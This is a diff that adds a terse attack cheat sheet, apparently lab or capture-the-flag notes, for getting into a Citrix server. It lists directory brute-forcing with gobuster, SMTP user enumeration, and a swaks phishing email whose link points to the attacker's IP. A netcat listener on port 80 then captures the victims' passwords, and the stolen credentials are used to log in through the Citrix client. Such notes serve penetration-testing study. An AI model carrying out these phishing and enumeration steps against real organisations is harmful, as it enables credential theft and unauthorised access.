@@ -1,1 +1,13 @@
+### 1. Get credential to login to citrix server
+# gobuster
 gobuster -k -u https://humongousretail.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o <local> -t 30
+# Get mail users
+smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D <domain> -t <ip> -m 50 -M RCPT
+# phishing info to my ip
+swaks --to <one user> --from <another user> --header "Subject: Credentials / Errors" --body "citrix http://<my ip>" --server <domain>
+nc -lnvp 80: get password by phishing
+
+### 2.
+# login to /remote(need citrix install)
+# click icon downloads .ica
+# Use citrix client to connect to citrix
